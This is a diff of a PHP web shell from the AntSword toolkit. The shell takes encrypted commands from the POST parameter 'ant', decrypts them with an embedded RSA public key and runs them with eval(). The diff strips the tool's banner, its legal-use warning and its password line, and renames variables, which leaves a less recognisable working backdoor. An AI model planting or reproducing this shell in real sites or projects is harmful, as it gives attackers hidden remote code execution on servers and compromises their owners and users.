@@ -1,21 +1,6 @@
-<?php 
-/**
-*              _   ____                       _
-*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
-*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
-* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
-*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
-* ———————————————————————————————————————————————
-*     AntSword PHP eval RSA Script
-* 
-*     警告：
-*         此脚本仅供合法的渗透测试以及爱好者参考学习
-*          请勿用于非法用途，否则将追究其相关责任！
-* ———————————————————————————————————————————————
-* pwd=ant
-*/
+<?php
 $cmd = @$_POST['ant'];
-$publicKey = <<<EOF
+$pk = <<<EOF
 -----BEGIN PUBLIC KEY-----
 MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfkSvRs2XrTxl/B9luPPxHq6hT
 Qjq0JAUsfMpicgR05PILVVHmLH7cdU2PCRt3XlRBtCQ0EW2SJkS2xb//2s5W3ZMo
@@ -24,12 +9,11 @@ gpf0f1Jxmo40hzNV6wIDAQAB
 -----END PUBLIC KEY-----
 EOF;
 $cmds = explode("|", $cmd);
-$publicKey = openssl_pkey_get_public($publicKey);
+$pk = openssl_pkey_get_public($pk);
 $cmd = '';
 foreach ($cmds as $value) {
-	if (openssl_public_decrypt(base64_decode($value), $de, $publicKey)) {
-		$cmd .= $de;
-	}
+  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
+    $cmd .= $de;
+  }
 }
 eval($cmd);
-?>
